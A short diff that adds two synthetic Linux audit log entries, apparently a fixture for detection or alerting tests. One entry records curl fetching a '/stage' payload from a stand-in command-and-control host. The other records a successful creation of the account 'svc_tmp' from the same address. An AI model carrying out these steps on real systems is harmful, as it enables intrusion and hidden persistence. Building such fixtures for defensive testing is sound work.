@@ -1,0 +1,2 @@
+type=EXECVE msg=audit(1795773615.100:501): node=prod-core-01 acct="ops" exe="/usr/bin/curl" proctitle="curl_stage_probe https://c2-drop.example.invalid/stage" addr=198.51.100.88
+type=ADD_USER msg=audit(1795773620.200:502): node=prod-core-01 acct="svc_tmp" res=success addr=198.51.100.88
